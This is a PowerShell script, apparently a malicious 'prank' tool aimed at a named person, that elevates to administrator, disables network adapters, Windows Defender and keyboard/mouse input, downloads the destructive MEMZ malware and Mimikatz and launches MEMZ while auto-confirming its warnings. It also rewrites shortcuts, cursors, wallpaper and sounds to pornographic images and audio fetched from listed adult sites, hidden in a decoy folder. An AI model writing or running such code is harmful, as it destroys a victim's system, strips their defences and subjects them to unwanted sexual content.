# Allow script: Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine
# Disable tamper: Configuration > Updates & security > Windows security > AV & threat configuration 
# Add permisons to folder $env:SYSTEMDRIVE\ProgramData\Microsoft\Windows\SystemData\
# TODO Fix function parameters
# TODO Fix outputs readability
# TODO Add resources

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-File $($MyInvocation.MyCommand.Path)"
    Exit
}


function addTasks {

}

function disableNetworkAdapters {
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    Write-Output "[+] All network adapters disabled"
}

function disableInputs {
    param (
        [int]$seconds
    )
    
    $code = @'
        [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);
'@

    $userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

    Write-Output "[!] Mouse disabled"
    Write-Output "[!] Keyboard disabled"
    $userInput::BlockInput($true)
    Start-Sleep -Seconds $seconds
    $userInput::BlockInput($false)
    Write-Output "[+] Mouse enabled"
    Write-Output "[+] Keyboard enabled"
}

function changeSettings { # NEED PARAMS
    param (
        [Parameter()]
        [string]$audiosDirectory,
        [Parameter()]
        [string]$imagesDirectory
    )

    function changeTimeZone {
        $timezone = "Yakutsk Standard Time"
        $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"

        $timeZoneData = Get-TimeZone -Id "Central Standard Time"
        $timeZoneHash = @{
            "TimeZoneKeyName" = $timeZoneData.Id
            "StandardName" = $timeZoneData.StandardName
            "DaylightName" = $timeZoneData.DayLightName
            "ActiveTimeBias" = -($timeZoneData.BaseUtcOffset.TotalMinutes)
        }

        New-ItemProperty -Path $registryPath -Name "TimeZoneKeyName" -Value $timeZoneHash["TimeZoneKeyName"] -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $registryPath -Name "StandardName" -Value $timeZoneHash["StandardName"] -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $registryPath -Name "DaylightName" -Value $timeZoneHash["DaylightName"] -PropertyType String -Force | Out-Null
        New-ItemProperty -Path $registryPath -Name "ActiveTimeBias" -Value $timeZoneHash["ActiveTimeBias"] -PropertyType DWord -Force | Out-Null

        Write-Output "[+] Timezone changed"
    }

    function changeRegion {
        $registryPath = "HKCU:\Control Panel\International"
        $region = @{
            "sCountry" = "KH"
            "sLanguage" = "km-KH"
        }

        $region.GetEnumerator() | ForEach-Object {
            Set-ItemProperty -Path $registryPath -Name $_.Key -Value $_.Value
        }

        Restart-Service -Name Winmgmt -Force
        Write-Output "[+] Region changed"
    }

    function changeScreenLanguage {
        $language = "km-KH"
        Install-Language -Language $language
        Set-WinUILanguageOverride -Language $language
        Set-WinSystemLocale -SystemLocale $language
        Set-WinUserLanguageList -Language $language -Force

        Write-Output "[+] Language changed"
    }

    function changeDefaultSound {
        $regPaths = Get-ChildItem -Path "HKCU:\AppEvents\Schemes\Apps\.Default" | Select-Object -ExpandProperty Name
        $audioPath = "$audiosDirectory\AlexisTexas.wav" # Maybe random in the future
        $wshell = New-Object -ComObject WScript.Shell
        foreach ($regPath in $regPaths) {
            $wshell.RegWrite("$regPath\.Current\", $audioPath, "REG_SZ")
        }

        Write-Output "[+] Default sound changed"
    }

    function changeMouseScheme {
        function updateRegistry {
            $cursorsList = Get-ChildItem -Path $imagesDirectory -File -Filter *.ani
            $randomCursor = $($cursorsList | Get-Random)

            $cursorPath = "$imagesDirectory\$randomCursor"

            $regConnect = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]"CurrentUser","$env:COMPUTERNAME")
            $regCursors = $regConnect.OpenSubKey("Control Panel\Cursors",$true)

            $regCursors.SetValue("","Windows Black")
            $regCursors.SetValue("AppStarting", $cursorPath)
            $regCursors.SetValue("Arrow", $cursorPath)
            $regCursors.SetValue("Crosshair", $cursorPath)
            $regCursors.SetValue("Hand", $cursorPath)
            $regCursors.SetValue("Help", $cursorPath)
            $regCursors.SetValue("IBeam", $cursorPath)
            $regCursors.SetValue("No", $cursorPath)
            $regCursors.SetValue("NWPen", $cursorPath)
            $regCursors.SetValue("SizeAll", $cursorPath)
            $regCursors.SetValue("SizeNESW",$cursorPath)
            $regCursors.SetValue("SizeNS", $cursorPath)
            $regCursors.SetValue("SizeNWSE", $cursorPath)
            $regCursors.SetValue("SizeWE", $cursorPath)
            $regCursors.SetValue("UpArrow", $cursorPath)
            $regCursors.SetValue("Wait", $cursorPath)
            $regCursors.Close()
            $regConnect.Close()

            Write-Output "[+] Mouse registry updated"
        }
        
        function applyChanges {
            $code = @'
                [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
                public static extern bool SystemParametersInfo( uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
'@
            $cursorRefresh = Add-Type -MemberDefinition $code -Name WinAPICall -Namespace SystemParamInfo -PassThru
            $cursorRefresh::SystemParametersInfo(0x0057,0,$null,0)

            Write-Output "[+] Mouse registry applied"
        }

        updateRegistry
        applyChanges

        Write-Output "[+] Mouse scheme changed"
    }

    #changeTimeZone # NOT WORKING AT REAL TIME
    #changeRegion # NOT WORKING AT REAL TIME
    #changeScreenLanguage # TODO - Change keyboard but no the screen language
    Write-Output $imagesDirectory

    changeMouseScheme
    #changeDefaultSound
    #Restart-Computer -Force

}

function persistanceChanges {
    param (
        [string]$malwareDirectory
    )

    function disableWindowsDefender {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Output "[+] Windows Defender Uninstalled"
    }

    function downloadMalware {
        $memzURL = "https://github.com/Dfmaaa/MEMZ-virus/raw/main/MEMZ.exe"
        $mimikatzURL = "https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe"

        Invoke-WebRequest $memzURL -Outfile "$malwareDirectory\MEMZ.exe"
        Write-Output "[+] MEMZ Downloaded"
        Invoke-WebRequest $mimikatzURL -Outfile "$malwareDirectory\mimikatz.exe"
        Write-Output "[+] Mimikatz Downloaded"
    }

    function FUCKHUGO {
        Write-Output "[!!!] FUCK HUGO"
        $memzPath = "$malwareDirectory\MEMZ.exe"
        Add-Type -AssemblyName System.Windows.Forms
        Start-Process -FilePath $memzPath -PassThru -NoNewWindow
        
        for ($i = 3; $i -ge 1; $i--) {
            Write-Output "[+] FUCKED IN $i"
            Start-Sleep -Seconds 1
        }
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

        Write-Output "[+] HAHAHAHAH THIS IS SO FUNNY"

        for ($i = 3; $i -ge 1; $i--) {
            Write-Output "[+] PERMA FUCKED IN $i"
            Start-Sleep -Seconds 1
        }
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

    }

    function stealData {

    }

    disableWindowsDefender
    downloadMalware
    FUCKHUGO # HIGH RISK - SCRIPTED FOR THE OTHER SCRIPT
}

function changeShortcuts { # PARAMS NECESSARY
    $object = New-Object -COM WScript.Shell
    Write-Output "[+] Searching Shortcuts"
    $shortcuts = Get-Childitem -Path "$env:SYSTEMDRIVE\Users" -Recurse -Exclude 'C:\Windows\' -Include "*.lnk" -ErrorAction SilentlyContinue
    $url = "https://youtube.com"

    foreach ($shortcutPath in $shortcuts) {
        $shortcut = $object.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $url
        $shortcut.IconLocation = "$env:SYSTEMDRIVE\Users\$env:USERNAME\Downloads\gun.ico" # TODO DOWNLOAD MORE ICOS AND SET IT RANDOMLY
        $shortcut.Save()
        Write-Output "[+] Shortcut $($shortcut.FullName) modified"

    }
}

function changeWallpapers {
    param (
        [string]$imagesDirectory
    )

    function deleteWallpaperEngine {
        #detect and uninstall wallpaper engine
    }

    function detectAppropriatedImages {

        Add-Type -AssemblyName System.Drawing

        $images = Get-ChildItem -Path $imagesDirectory -File -Filter *.jpg
        $fileList = $images.FullName
        [System.Collections.ArrayList]$appropriateImages = @()

        foreach ($image in $fileList) {
            $loadedImage = [System.Drawing.Image]::FromFile($image)

            if ($($loadedImage.Width) -ge 1920 -and $($loadedImage.Height) -ge 1080) {
                $appropriateImages += ($image)
            }

            $loadedImage.Dispose()
        }

        return $appropriateImages
    }

    function setWallpaper {
        $randomImage = $($wallpapers | Get-Random)
        $code = @' 
            using System.Runtime.InteropServices; 
            namespace Win32 { 
                public class Wallpaper { 
                    [DllImport("user32.dll", CharSet=CharSet.Auto)] 
                    static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni); 
         
                    public static void SetWallpaper(string path) { 
                        SystemParametersInfo(20,0,path,3); 
                    }
                }
            }
'@

        Add-Type $code 
        [Win32.Wallpaper]::SetWallpaper($randomImage)
        Write-Output "Wallpaper changed to $randomImage"
    }

    function setLockScreen {
        $randomImage = $($wallpapers | Get-Random)

        $registryPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP"

        REG ADD $registryPath /f
        REG ADD $registryPath /v LockScreenImagePath /t REG_SZ /d $randomImage /f
        REG ADD $registryPath /v LockScreenImageUrl /t REG_SZ /d $randomImage /f
        REG ADD $registryPath /v LockScreenImageStatus /t REG_DWORD /d 1 /f
        icacls "$env:SYSTEMDRIVE\ProgramData\Microsoft\Windows\SystemData\" /reset /t /c /l /q

        Write-Output "Lock screen changed to $randomImage"
    }

    $wallpapers = detectAppropriatedImages
    #setWallpaper
    #setLockScreen # PERMANENT # FIX ISSUE NOT WORKING
}

function prepareEnvironment {
    param (
        [Parameter()]
        [string]$baseDirectory,
        [Parameter()]
        [string]$temporalDirectory,
        [Parameter()]
        [string]$toolsDirectory,
        [Parameter()]
        [string]$imagesDirectory,
        [Parameter()]
        [string]$audiosDirectory,
        [Parameter()]
        [string]$videosDirectory,
        [Parameter()]
        [string]$decoyName
    )

    function createDirectories {
        function programDirs {
            $directories = @("Images","Videos","Audios","Data","Software")

            New-Item -Path $baseDirectory -Name $decoyName -ItemType Directory -Force | Out-Null
            Write-Output "[+] Directory $decoyName Created"
            foreach ($directory in $directories) {
                New-Item -Path "$baseDirectory\$decoyName" -Name $directory -ItemType Directory -Force | Out-Null
                Write-Output "[+] Directory $directory Created"
            }
        }

        function toolsDirs {
            New-Item -Path $temporalDirectory -Name "Tools" -ItemType Directory -Force | Out-Null
            Write-Output "[+] Directory Tools created"
        }
        programDirs
        toolsDirs
    }

    function downloadVideos { 
    }

    function downloadAudios {
        $urls = @("https://www.youtube.com/watch?v=TEJd4Sxa4sk", "https://www.youtube.com/watch?v=pqgSKzugDPg")
        $filenames = @("AlexisTexas.wav", "LoudGirlMoanings.wav")

        $ytdlpPath = "$toolsDirectory\yt-dlp.exe"
        $ffmpegPath = "$toolsDirectory\ffmpeg\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe"

        for ($index = 0; $index -lt $urls.Count; $index++) {
            Write-Output "[+] Downloading audio $($filenames[$index])"
            Powershell "$ytdlpPath -x --extract-audio --audio-format wav $($urls[$index]) --ffmpeg-location $ffmpegPath --audio-quality 0 -o '$audiosDirectory\$($filenames[$index])'" | Out-Null
        }

        Write-Output "[=] Audios downloaded Successfully"
    }

    function downloadImages {
        $urls = @("https://cdn.boyspornpics.com/galleries/k/1706/9.jpg","https://i.fapality.com/videos_screenshots/48000/48328/preview.jpg","https://th.bing.com/th/id/OIP.5dB8mdNV8Bn4pANsf_P3AQHaEK?rs=1&pid=ImgDetMain","https://static-ca-cdn.eporner.com/gallery/iB/h2/p7Hh9Arh2iB/358651-close-up-blond-black-hair-mouth.jpg","https://th.bing.com/th/id/OIP.ryQqe2zT_kfJQWaMKVxy-gHaE8?rs=1&pid=ImgDetMain","https://th.bing.com/th/id/R.202a4ee81e67699b9f5c45402cb81c8f?rik=SNYSaz4pogMqJw&pid=ImgRaw&r=0","https://t.boyfriendtv.com/bftv/images/2020-05/5e/5ec3775ea100c/5ec3775ea100c-full-28.jpg","https://th.bing.com/th/id/R.c1018dedb2e05532449a2f079b6d63c5?rik=HxaNaCni3XFkKQ&pid=ImgRaw&r=0","https://imgs1cdn.adultempire.com/galleries/76/136638919472448576_3000.jpg","https://th.bing.com/th/id/OIP.Rgx1OsCMTlfjVy6BRoNC0AHaEK?rs=1&pid=ImgDetMain","https://th.bing.com/th/id/R.77e5a8df1a5ff8993e787308be7dba9c?rik=5fxjL9YehPv%2fAg&pid=ImgRaw&r=0","https://th.bing.com/th/id/R.ecab2c46f100af0dcc6570ce5b514521?rik=BBFXDwMMFfLQkw&pid=ImgRaw&r=0","http://www.rw-designer.com/cursor-download.php?id=127390","http://www.rw-designer.com/icon-download.php?id=22939","http://www.rw-designer.com/icon-download.php?id=24207","http://www.rw-designer.com/icon-download.php?id=12764","http://www.rw-designer.com/icon-download.php?id=12767","http://www.rw-designer.com/icon-download.php?id=12768","http://www.rw-designer.com/icon-download.php?id=12769","http://www.rw-designer.com/cursor-download.php?id=62984","http://www.rw-designer.com/cursor-download.php?id=127389","http://www.rw-designer.com/cursor-download.php?id=127391")
        $filenames = @("gayPic1.jpg","6bbcvs1girl.jpg","2blackboys.jpg","pussygripgirl.jpg","2gaysfucking.jpg","3assholes.jpg","gayfisting.jpg","gayfisting2.jpg","doubleP.jpg","blackmalefucking.jpg","lanegradeoto.jpg","bbcanal.jpg","sex.ani","midgets.ico","nakedman.ico","sexyman.ico","dick.ico","dick2.ico","dick3.ico","sex2.ani","boobs.ani","sex3.ani")

        for ($index = 0; $index -lt $urls.Count; $index++) {
            Write-Output "[+] Downloading image $($filenames[$index])"
            Invoke-WebRequest $($urls[$index]) -OutFile "$imagesDirectory\$($filenames[$index])"
        }

        Write-Output "[=] Images downloaded Successfully"
    }

    function installYTdownloader {
        $ytdlpUrl = "https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe"
        $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"

        Write-Output "[+] Downloading yt-dlp.exe"
        Invoke-WebRequest $ytdlpUrl -OutFile "$toolsDirectory\yt-dlp.exe"
        
        Write-Output "[+] Downloading FFMpeg"
        Invoke-WebRequest $ffmpegUrl -OutFile "$toolsDirectory\ffmpeg.zip"
        Write-Output "[+] Extracting FFMpeg"
        Expand-Archive -Path "$toolsDirectory\ffmpeg.zip" -DestinationPath "$toolsDirectory\ffmpeg" -Force
    }

    #createDirectories
    #installYTdownloader
    downloadImages
    #downloadVideos
    #downloadAudios
}
   
function main {
    $ProgressPreference = 'SilentlyContinue'

    $baseDir = "$env:WINDIR\Media"
    $tempDir = "$env:WINDIR\Temp"
    $decoyDirectory = "Resources"

    $toolsDir = "$tempDir\Tools"
    $imagesDir = "$baseDir\$decoyDirectory\Images"
    $audiosDir = "$baseDir\$decoyDirectory\Audios"
    $videosDir = "$baseDir\$decoyDirectory\Videos"
    $dataDir = "$baseDir\$decoyDirectory\Data"
    $malwareDir = "$baseDir\$decoyDirectory\Software"

    #prepareEnvironment -baseDirectory $baseDir -temporalDirectory $tempDir -toolsDirectory $toolsDir -imagesDirectory $imagesDir -audiosDirectory $audiosDir -videosDirectory $videosDir -decoyName $decoyDirectory
    #changeWallpapers -imagesDirectory $imagesDir
    changeSettings -audiosDirectory $audiosDir -imagesDirectory $imagesDir # TODO think more jokes
    #changeShortcuts
    #persistanceChanges -malwareDirectory $malwareDir
    #disableMouse -seconds 10
    Write-Output "[!] Script ended"
}

main